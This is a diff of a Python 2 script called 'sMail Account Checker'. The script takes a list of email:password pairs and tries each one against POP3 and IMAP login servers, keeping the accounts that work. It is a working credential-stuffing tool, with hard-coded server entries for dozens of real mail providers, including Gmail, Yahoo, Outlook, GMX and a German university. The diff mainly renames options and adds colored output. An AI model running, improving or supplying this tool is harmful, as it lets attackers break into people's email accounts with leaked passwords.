@@ -2,21 +2,23 @@
 # author: m0nk3y
 # With this tool you can get valid email:pass from a list
 
-import linecache
-import sys, poplib
-import time
 import argparse
 import csv
 import imaplib
+import linecache
+import poplib
+import sys
+import time
 
-parser = argparse.ArgumentParser(description='This script checks a given file for valid email accounts (testing default: POP3)')
-parser.add_argument('-f','--file', help='File with <account@provider.com>:<passwd> each line',required=False,default=None)
-parser.add_argument('-s','--sleep', help='Break between each check',required=False,default=0)
-parser.add_argument('-p','--provider', help='Specify a provider -p [tag]',required=False,default=None)
+parser = argparse.ArgumentParser(description='This tool checks a given list for valid email accounts (testing default: POP3)')
+parser.add_argument('-f','--file', help='File with <email>:<pass> each line',required=False,default=None)
+parser.add_argument('-s','--sleep', help='Pause in seconds between each check',required=False,default=0)
+parser.add_argument('-p','--provider', help='Specify a provider -p [tag] (e.g. gmail.com)',required=False,default=None)
 parser.add_argument('-o','--output', help='Filename to write output into',required=False,default=False)
-parser.add_argument('-n','--nonvalid', help='Filename to write nonvalid output into',required=False,default=False)
-parser.add_argument('-i','--imap', help='use IMAP instead of POP3 (e.g. for Hotmail/Outlook)',required=False,default=False,action="store_true")
-parser.add_argument('-l','--list', help='List all supported Provider-Tags',required=False,default=False,action="store_true")
+parser.add_argument('-n','--invalid', help='Filename to write invalid output into',required=False,default=False)
+parser.add_argument('-i','--imap', help='use IMAP first, then POP3 for unchecked. Some provider only offers IMAP.',required=False,action="store_true")
+parser.add_argument('-l','--list', help='List all supported provider tags',required=False,action="store_true")
+parser.add_argument('-c','--colorize', help='Add color to output',required=False,action="store_true")
 
 args = parser.parse_args()
 
@@ -25,32 +27,42 @@ providers_imap = []
 accounts = []
 
 results = []
-nonvalid = []
+invalid = []
 
 class c:
-    HEADER = '\033[95m'
-    OKBLUE = '\033[94m'
-    OKGREEN = '\033[92m'
-    WARNING = '\033[93m'
-    FAIL = '\033[91m'
-    ENDC = '\033[0m'
-    BOLD = '\033[1m'
-    UNDERLINE = '\033[4m'
-
+    HEADER = ''
+    OKBLUE = ''
+    OKGREEN = ''
+    WARNING = ''
+    FAIL = ''
+    ENDC = ''
+    BOLD = ''
+    UNDERLINE = ''
+    if args.colorize:
+        HEADER = '\033[95m'
+        OKBLUE = '\033[94m'
+        OKGREEN = '\033[92m'
+        WARNING = '\033[93m'
+        FAIL = '\033[91m'
+        ENDC = '\033[0m'
+        BOLD = '\033[1m'
+        UNDERLINE = '\033[4m'
 
 def main():
 
     print  c.HEADER+"[***************************]"
     print "[*  sMail Account Checker  *]"
     print "[***************************]"+c.ENDC
-    print c.FAIL+"    ---- by m0nk3y ----\n"+c.ENDC
+    print c.FAIL+"    ---- by m0nk3y ----"+c.ENDC
+    print c.UNDERLINE+"       KEEP SMILING :)\n\n"
+    print "(Hint: Try this with colors -c)\n"
 
     if args.list:
         listProviders()
         exit(1)
 
     if args.file == None:
-        print c.FAIL+c.BOLD+"No input file given   -f <filename>"+c.ENDC
+        print c.FAIL+c.BOLD+"No inputfile given. Try --help for more info"+c.ENDC
         exit(1)
     print "[~] File: " + c.BOLD+ args.file + c.ENDC
     print "[~] Sleep: " + c.BOLD+ str(args.sleep) + c.ENDC
@@ -60,6 +72,7 @@ def main():
         PrintException()
 
     print "[~] Acounts in file: " + c.BOLD+ str(len(accounts)) + c.ENDC
+    time.sleep(2)
     print c.BOLD+c.WARNING+"[*] Testing Accounts"+c.ENDC
 
     if len(accounts) > 0:
@@ -73,6 +86,12 @@ def main():
         print c.FAIL+c.BOLD+"\nCouldn't find any account in your file (wrong filename?)\n"+c.ENDC
 
     exit(0)
+
+
+
+
+
+
 
 def listProviders():
     global providers
@@ -90,15 +109,15 @@ def listProviders():
 
 def printResult():
     global results
-    global nonvalid
+    global invalid
     print c.BOLD+"\n[=] Valid accounts found: "+str(len(results))+c.ENDC
-    print str(len(accounts)-len(nonvalid))+" not tested"
+    print str(len(accounts)-len(invalid))+" not tested"
     for r in results:
         print r
 
 def testAccounts(providers,sleep):
     global results
-    global nonvalid
+    global invalid
     global accounts
 
     for provider in providers:
@@ -131,10 +150,10 @@ def testAccounts(providers,sleep):
                 accounts.remove(acc)
             except:
                 print c.FAIL+"[!] "+email+"\t failed!"+c.ENDC
-                nonvalid.append(email+":"+passwd)
-                if args.nonvalid!=False:
+                invalid.append(email+":"+passwd)
+                if args.invalid!=False:
                     try:
-                        writeIntoFile(args.nonvalid, email+":"+passwd)
+                        writeIntoFile(args.invalid, email+":"+passwd)
                     except:
                         PrintException()
 
@@ -142,7 +161,7 @@ def testAccounts(providers,sleep):
 
 def testAccountsIMAP(providers_imap, sleep):
     global results
-    global nonvalid
+    global invalid
     global accounts
 
     for provider in providers_imap:
@@ -177,10 +196,10 @@ def testAccountsIMAP(providers_imap, sleep):
 
             except:
                 print c.FAIL+"[!] "+email+"\t failed!"+c.ENDC
-                nonvalid.append(email+":"+passwd)
-                if args.nonvalid!=False:
+                invalid.append(email+":"+passwd)
+                if args.invalid!=False:
                     try:
-                        writeIntoFile(args.nonvalid, email+":"+passwd)
+                        writeIntoFile(args.invalid, email+":"+passwd)
                     except:
                         PrintException()
 
@@ -214,7 +233,6 @@ class Provider:
         self.server = server
         self.port = port
 
-
 def writeIntoFile(filename, value):
     global c
     if value != None:
@@ -224,69 +242,84 @@ def writeIntoFile(filename, value):
     else:
         print c.FAIL+c.BOLD+"Error while creating File :: no content given"+c.ENDC
 
+class Provider:
+    tag = None
+    server = None
+    port = None
+
+    def __init__(self, tag, server, port):
+        self.tag = tag
+        self.server = server
+        self.port = port
+
 
 # List of Providers:
-providers.append(Provider("hs-weingarten.de","mail.hs-weingarten.de",995))
-providers.append(Provider("gmail.com","pop.gmail.com",995))
-providers.append(Provider("gmx.net","pop.gmx.net",995))
-providers.append(Provider("web.de","pop3.web.de",995))
-providers.append(Provider("1und1.de","pop.1und1.de",995))
-providers.append(Provider("a1.net","pop.a1.net",110))
-providers.append(Provider("alice.de","pop3.alice.de",110))
-providers.append(Provider("arcor.de","pop3.arcor.de",110))
-providers.append(Provider("chello.at","pop.chello.at",110))
-providers.append(Provider("compuserve.de","pop.compuserve.de",110))
-providers.append(Provider("drei.at","pop3.drei.at",995))
-providers.append(Provider("easyline.at","pop.easyline.at",110))
-providers.append(Provider("everyday.com","virtual.everyday.com",110))
-providers.append(Provider("freenet.de","mx.freenet.de",110))
-providers.append(Provider("upcbusiness.at","mail.upcbusiness.at",995))
-providers.append(Provider("kabelbw.de","pop.kabelbw.de",110))
-providers.append(Provider("kabelmail.de","pop3.kabelmail.de",110))
-providers.append(Provider("kabsi.at","mail.kabsi.at",110))
-providers.append(Provider("linzag.net","pop.linzag.net",110))
-providers.append(Provider("live.com","pop3.live.com",995))
-providers.append(Provider("liwest.at","pop.liwest.at",110))
-providers.append(Provider("o2mail.de","mail.o2mail.de",110))
-providers.append(Provider("o2online.de","pop.o2online.de",995))
-providers.append(Provider("t-online.de","securepop.t-online.de",995))
-providers.append(Provider("vodafone.de","pop.vodafone.de",995))
-providers.append(Provider("yahoo.com","pop.mail.yahoo.com",995))
-providers.append(Provider("yahoo.de","pop.mail.yahoo.de",995))
-providers.append(Provider("aol.com","pop.aol.com",110))
-providers.append(Provider("pop.aim.com","pop.aim.com",110))
-providers.append(Provider("firemail.de","firemail.de",110))
-providers.append(Provider("mail.de","pop.mail.de",995))
-providers.append(Provider("smart-mail.de","pop.smart-mail.de",110))
-providers.append(Provider("sxmail.de","pop3.sxmail.de",110))
-providers.append(Provider("unitybox.de","mail.unitybox.de",995))
-providers.append(Provider("strato.de","pop3.strato.de",110))
+providers.append(Provider("hs-weingarten.de", "mail.hs-weingarten.de", 995))
+providers.append(Provider("gmail.com", "pop.gmail.com", 995))
+providers.append(Provider("gmx.net", "pop.gmx.net", 995))
+providers.append(Provider("web.de", "pop3.web.de", 995))
+providers.append(Provider("1und1.de", "pop.1und1.de", 995))
+providers.append(Provider("a1.net", "pop.a1.net", 110))
+providers.append(Provider("alice.de", "pop3.alice.de", 110))
+providers.append(Provider("arcor.de", "pop3.arcor.de", 110))
+providers.append(Provider("chello.at", "pop.chello.at", 110))
+providers.append(Provider("compuserve.de", "pop.compuserve.de", 110))
+providers.append(Provider("drei.at", "pop3.drei.at", 995))
+providers.append(Provider("easyline.at", "pop.easyline.at", 110))
+providers.append(Provider("everyday.com", "virtual.everyday.com", 110))
+providers.append(Provider("freenet.de", "mx.freenet.de", 110))
+providers.append(Provider("upcbusiness.at", "mail.upcbusiness.at", 995))
+providers.append(Provider("kabelbw.de", "pop.kabelbw.de", 110))
+providers.append(Provider("kabelmail.de", "pop3.kabelmail.de", 110))
+providers.append(Provider("kabsi.at", "mail.kabsi.at", 110))
+providers.append(Provider("linzag.net", "pop.linzag.net", 110))
+providers.append(Provider("live.com", "pop3.live.com", 995))
+providers.append(Provider("liwest.at", "pop.liwest.at", 110))
+providers.append(Provider("o2mail.de", "mail.o2mail.de", 110))
+providers.append(Provider("o2online.de", "pop.o2online.de", 995))
+providers.append(Provider("t-online.de", "securepop.t-online.de", 995))
+providers.append(Provider("vodafone.de", "pop.vodafone.de", 995))
+providers.append(Provider("yahoo.com", "pop.mail.yahoo.com", 995))
+providers.append(Provider("yahoo.de", "pop.mail.yahoo.de", 995))
+providers.append(Provider("aol.com", "pop.aol.com", 110))
+providers.append(Provider("pop.aim.com", "pop.aim.com", 110))
+providers.append(Provider("firemail.de", "firemail.de", 110))
+providers.append(Provider("mail.de", "pop.mail.de", 995))
+providers.append(Provider("smart-mail.de", "pop.smart-mail.de", 110))
+providers.append(Provider("sxmail.de", "pop3.sxmail.de", 110))
+providers.append(Provider("unitybox.de", "mail.unitybox.de", 995))
+providers.append(Provider("strato.de", "pop3.strato.de", 110))
 
 
-providers_imap.append(Provider("hs-weingarten.de","mail.hs-weingarten.de",993))
-providers_imap.append(Provider("hotmail.com","imap-mail.outlook.com",993))
-providers_imap.append(Provider("live.com","imap-mail.outlook.com",993))
-providers_imap.append(Provider("live.de","imap-mail.outlook.com",993))
-providers_imap.append(Provider("outlook.com","imap-mail.outlook.com",993))
-providers_imap.append(Provider("1und1.de","imap.1und1.de",993))
-providers_imap.append(Provider("a1.net","imap.a1.net",143))
-providers_imap.append(Provider("alice.de","imap.alice.de",143))
-providers_imap.append(Provider("arcor.de","imap.arcor.de",993))
-providers_imap.append(Provider("drei.at","imaps.drei.at",993))
-providers_imap.append(Provider("freenet.de","mx.freenet.de",993))
-providers_imap.append(Provider("gmx.net","imap.gmx.net",993))
-providers_imap.append(Provider("gmail.com","imap.gmail.com",993))
-providers_imap.append(Provider("googlemail.com","imap.gmail.com",993))
-providers_imap.append(Provider("kabelbw.de","imap.kabelbw.de",143))
-providers_imap.append(Provider("kabsi.at","imap.kabsi.at",143))
-providers_imap.append(Provider("etcologne.de","imap.netcologne.de",993))
-providers_imap.append(Provider("o2mail.de","mail.o2mail.de",143))
-providers_imap.append(Provider("o2online.de","imap.o2online.de",143))
-providers_imap.append(Provider("cablelink.at","mail.cablelink.at",143))
-providers_imap.append(Provider("telering.at","mail.telering.at",993))
-providers_imap.append(Provider("t-online.de","secureimap.t-online.de",993))
-providers_imap.append(Provider("vodafone.de","imap.vodafone.de",993))
-providers_imap.append(Provider("web.de","imap.web.de",993))
-providers_imap.append(Provider("yahoo.de","imap.mail.yahoo.de",993))
+providers_imap.append(Provider("hs-weingarten.de", "mail.hs-weingarten.de", 993))
+providers_imap.append(Provider("hotmail.com", "imap-mail.outlook.com", 993))
+providers_imap.append(Provider("live.com", "imap-mail.outlook.com", 993))
+providers_imap.append(Provider("live.de", "imap-mail.outlook.com", 993))
+providers_imap.append(Provider("outlook.com", "imap-mail.outlook.com", 993))
+providers_imap.append(Provider("1und1.de", "imap.1und1.de", 993))
+providers_imap.append(Provider("a1.net", "imap.a1.net", 143))
+providers_imap.append(Provider("alice.de", "imap.alice.de", 143))
+providers_imap.append(Provider("arcor.de", "imap.arcor.de", 993))
+providers_imap.append(Provider("drei.at", "imaps.drei.at", 993))
+providers_imap.append(Provider("freenet.de", "mx.freenet.de", 993))
+providers_imap.append(Provider("gmx.net", "imap.gmx.net", 993))
+providers_imap.append(Provider("gmail.com", "imap.gmail.com", 993))
+providers_imap.append(Provider("googlemail.com", "imap.gmail.com", 993))
+providers_imap.append(Provider("kabelbw.de", "imap.kabelbw.de", 143))
+providers_imap.append(Provider("kabsi.at", "imap.kabsi.at", 143))
+providers_imap.append(Provider("etcologne.de", "imap.netcologne.de", 993))
+providers_imap.append(Provider("o2mail.de", "mail.o2mail.de", 143))
+providers_imap.append(Provider("o2online.de", "imap.o2online.de", 143))
+providers_imap.append(Provider("cablelink.at", "mail.cablelink.at", 143))
+providers_imap.append(Provider("telering.at", "mail.telering.at", 993))
+providers_imap.append(Provider("t-online.de", "secureimap.t-online.de", 993))
+providers_imap.append(Provider("vodafone.de", "imap.vodafone.de", 993))
+providers_imap.append(Provider("web.de", "imap.web.de", 993))
+providers_imap.append(Provider("yahoo.de", "imap.mail.yahoo.de", 993))
 
+
+
+
+
+# Here starts the magic :)
 main()
